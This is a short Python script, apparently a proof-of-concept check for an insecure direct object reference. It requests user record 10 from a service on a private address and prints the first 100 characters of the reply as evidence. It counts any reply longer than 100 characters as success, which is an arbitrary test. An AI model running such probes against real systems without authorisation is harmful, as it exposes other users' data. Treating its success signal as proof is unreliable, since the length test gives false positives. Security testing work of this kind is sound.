import requests

def check_idor_vulnerability(target_url):
    # Hardcoded user id to test IDOR vulnerability
    test_user_id = 10

    # HTTP GET request to retrieve data for the test_user_id
    response = requests.get(f"{target_url}/user/{test_user_id}")

    # Check if the response is successful
    if response.status_code == 200:
        # Example evidence of a successful IDOR: checking content length or specific text
        if len(response.text) > 100:  # Arbitrary threshold for evidence
            print("RESULT: SUCCESS")
            print(f"Response from server: {response.text[:100]}... ( truncated due to length )")
        else:
            print("RESULT: NO_SIGNAL")
    else:
        print(f"RESULT: NO_SIGNAL - Status Code: {response.status_code}")

# Target URL for testing
target_url = "http://192.168.2.69:3000"

# Run the check
check_idor_vulnerability(target_url)